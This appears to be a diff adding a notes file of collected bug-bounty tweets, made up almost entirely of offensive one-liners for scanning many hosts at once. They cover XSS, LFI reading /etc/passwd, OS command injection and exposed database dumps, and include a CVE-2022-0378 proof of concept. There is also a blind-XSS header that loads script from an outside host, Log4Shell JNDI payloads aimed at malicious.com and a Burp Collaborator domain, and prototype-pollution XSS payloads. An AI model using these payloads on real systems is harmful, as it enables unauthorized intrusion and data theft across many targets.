@@ -1,0 +1,244 @@
+\\
+\\						tweets:
+\\				-------------------------------------------
+
+
+T1- 	Easy Stored XSS & HTML Injection 
+	site:http://target.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form" 
+
+
+T2-	Simple use 
+	subfinder -d target | httpx | tee target.txt 
+
+	cat target.txt | waybackurls | tee waybackdata
+
+	cat waybackdata | grep “sensitive keywords” 
+
+	cat subdomains.txt | waybackurls | tee waybackurls.txt | grep -E "\\.xls|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx"
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+T3-	Nice onliner:
+	Here it is:
+	https://twitter.com/hex0x42424242/status/1522241647718940672
+	cat hosts | while read host do; do curl -sk "https://$host/mgmt/shared/authn/login" | grep -q 'resterrorresponse' && printf "$host \0331;41mF5 iControl REST API Exposed\e[0m\n"; done
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+T4- 	Easy XSS At Scale 🔥🔥
+	cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert("foo")')()}} 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+T5- 	Now let's do it at scale using a double httpx shall we ? 🔥🔥
+	cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+T6- 	Easy XSS Anyone:
+	cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+T7- 	Automate Local File Inclusion (LFI)
+
+	gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+	gau http://target.com | gf lfi | qsreplace "/etc/passwd" | httpx -t 250 -mr "root:x" Done
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+T8- 	Open source is powerful 🔥
+	How to find this LFI at scale using 
+	@pdiscoveryio's httpx? 
+	cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+T9- 	How can you find this at scale with one command using 
+	@pdiscoveryio's httpx ? 
+	cat hosts.txt | httpx -sc -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443  | anew myP1s.txt
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+T10-	Check CNAME of your domains:
+	cat subdomain.txt| while read domain;do dig $domain;done | grep CNAME
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+T11- CVE-2022-0378 POC 🔥👇
+ 
+	✅ One Liner :
+	cat file.txt | while read h do;do curl -sk --insecure  "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && \echo "$h \033[0;31mVul\n" || echo "$h \033[0;32mNot\n";done
+
+
+--------------------------------------------------------------------------------------------------------------------
+
+
+
+T12- Check it on /api dir:
+	
+		/api/org/123 => leaked ORG_NAME only
+		/api/org/123/* => 403
+		/api/org/123/users =>403
+		/api/org/ORG_NAME/users =>403
+
+		/api/org/@org_name/users => 500
+		/api/org/@org_name/users/attributes  => blank response
+		/api/org/@org_name/users/attributes/email => BOOOM 
+
+
+=================================================================================================================
+
+T13- 
+	Simple Oneliner to Filter out Domains with "200 Status" and further digging:
+
+	cat domains.txt | httpx -follow-redirects -status-code -vhost -threads 100 | sort -u | grep "200" | cut -d [ -f1 | tee output.txt
+
+
+===================================================================================================================
+T14:-
+
+		Easy to find PUT method enabled mis configuration through 
+		@pdnuclei
+		 
+
+		1) Subdomain enumeration 
+		2) http probing through httpx
+		3) save file into the hosts.txt file
+		4) run nuclei on hosts.txt file
+		5) nuclei -l hosts.txt -severty high
+		6) got a response put-method-enabled
+
+====================================================================================================================
+T15:- 
+OS Command Injection at scale 🔥🔥🔥🔥
+cat hosts | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent
+
+====================================================================================================================
+
+T16-:
+LFI AT SCALE ~;
+cat host | gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
+
+===================================================================================================================
+
+T17-:
+
+New CVE dropped 🔥🔥
+cat hosts | httpx -path "/scgi-bin/platform.cgi" -mc 200 -p 80,443,8080,8443 -silent -nc
+then run Sqlmap real quick for those quick wins 
+
+===================================================================================================================
+
+T18-: Blind XSS - Oneliner:
+		
+		cat roots.txt | waybackuls.txt | httpx -H "User-Agent: \"><script src=https://abdulrahman2x.xss.ht></script>"
+
+===================================================================================================================
+T19-: Quick recon in one liner
+
+	cat rootDomain.txt | assetfinder | httprobe -c 50 --prefer-https -p http:80 http:8080 https:443 https:8443 http:9000 http:9001 http:9002 http:9003 | aquaton -out screenshots -thread 50
+
+===================================================================================================================
+
+
+
+
+
+ ${jndi:ldap://www.malicious.com/class.module.classLoader[knyru6d]=knyru6d}
+ ${jndi:ldap://1jls7kfl7mal5a8hzbeq7xapggm7aw.burpcollaborator.net/class.module.classLoader[knyru6d]=knyru6d}
+
+intigriti:XSS-Challenge:-
+------------------------
+https://challenge-0522.intigriti.io/challenge/challenge.html?page=1
+
+__proto__[test]=test
+
+?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src
+
+https://challenge-0522.intigriti.io/challenge/challenge.html?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src&__proto__[test]=%3Cimg%2520src%3Dx%2520onload%3Dalert%281%29%3E&page=test
+
+https://challenge-0522.intigriti.io/challenge/challenge.html?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src&__proto__[test]=%3Cimg%20src%3Dx%20onerror%3Dalert%282%29%3E&page=test
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
